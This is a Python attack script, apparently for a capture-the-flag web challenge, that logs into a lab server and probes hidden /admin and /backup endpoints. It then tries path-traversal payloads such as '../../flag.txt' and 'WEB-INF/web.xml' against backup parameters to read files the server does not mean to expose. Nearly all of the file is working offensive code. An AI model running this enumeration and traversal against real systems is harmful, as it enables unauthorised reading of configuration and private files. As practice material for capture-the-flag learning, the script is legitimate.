#!/usr/bin/env python3
"""
访问新发现的端点 /admin 和 /backup
"""

import requests
import random

BASE_URL = "http://192.168.18.25:25004"
session = requests.Session()

def register_and_login():
    username = f"user{random.randint(10000, 99999)}"
    password = "password123"
    
    session.post(f"{BASE_URL}/register", data={"username": username, "password": password})
    session.post(f"{BASE_URL}/login", data={"username": username, "password": password})
    print(f"[+] 登录: {username}")

def test_admin_endpoints():
    """测试/admin端点"""
    print("\n[*] 测试/admin端点...")
    
    admin_paths = [
        "/admin",
        "/admin/",
        "/admin/list",
        "/admin/upload",
        "/admin/files",
        "/admin/config",
        "/admin/flag",
        "/admin/dashboard",
        "/admin/status",
    ]
    
    for path in admin_paths:
        r = session.get(f"{BASE_URL}{path}")
        print(f"\n[{r.status_code}] GET {path}")
        if r.status_code == 200:
            print(f"Content-Type: {r.headers.get('Content-Type', 'N/A')}")
            print(f"内容: {r.text}")
            
            if "flag" in r.text.lower() or "pcb{" in r.text or "ctf{" in r.text:
                print(f"\n[!!! 找到FLAG !!!]")
                return r.text

def test_backup_endpoints():
    """测试/backup端点"""
    print("\n[*] 测试/backup端点...")
    
    backup_paths = [
        "/backup",
        "/backup/",
        "/backup/list",
        "/backup/download",
        "/backup/files",
        "/backup/export",
        "/backup/config",
        "/backup/database",
    ]
    
    for path in backup_paths:
        r = session.get(f"{BASE_URL}{path}")
        print(f"\n[{r.status_code}] GET {path}")
        if r.status_code == 200:
            print(f"Content-Type: {r.headers.get('Content-Type', 'N/A')}")
            print(f"内容: {r.text}")
            
            if "flag" in r.text.lower() or "pcb{" in r.text or "ctf{" in r.text:
                print(f"\n[!!! 找到FLAG !!!]")
                return r.text
        elif r.status_code == 500:
            print(f"  响应: {r.text[:300]}")

def try_backup_with_path_param():
    """尝试backup端点的path参数"""
    print("\n[*] 尝试backup端点的参数...")
    
    # BackUpServlet可能也有类似download的功能
    test_params = [
        ("path", "flag.txt"),
        ("file", "flag.txt"),
        ("filename", "flag.txt"),
        ("path", "../flag.txt"),
        ("path", "../../flag.txt"),
        ("path", "WEB-INF/web.xml"),
        ("path", "uploads%2f..%2fflag.txt"),
    ]
    
    for param, value in test_params:
        url = f"{BASE_URL}/backup?{param}={value}"
        r = session.get(url)
        
        if r.status_code == 200 and len(r.text) > 0:
            print(f"\n[+] {param}={value}: {r.status_code}")
            print(f"内容: {r.text[:500]}")
            
            if "flag" in r.text.lower() or "pcb{" in r.text or "ctf{" in r.text:
                print(f"\n[!!! 找到FLAG !!!]")
                return r.text

def test_admin_with_different_methods():
    """用不同HTTP方法测试admin端点"""
    print("\n[*] 测试admin端点的POST/PUT方法...")
    
    # POST测试
    r = session.post(f"{BASE_URL}/admin", data={})
    print(f"\n[{r.status_code}] POST /admin")
    if r.status_code == 200:
        print(f"内容: {r.text}")
    
    # 测试admin子路径
    r = session.post(f"{BASE_URL}/admin/list", data={})
    print(f"\n[{r.status_code}] POST /admin/list")
    if r.status_code == 200:
        print(f"内容: {r.text}")

def main():
    print(f"[*] 测试新发现的端点 {BASE_URL}")
    register_and_login()
    
    flag = test_admin_endpoints()
    if flag:
        return
    
    flag = test_backup_endpoints()
    if flag:
        return
    
    flag = try_backup_with_path_param()
    if flag:
        return
    
    test_admin_with_different_methods()

if __name__ == "__main__":
    main()
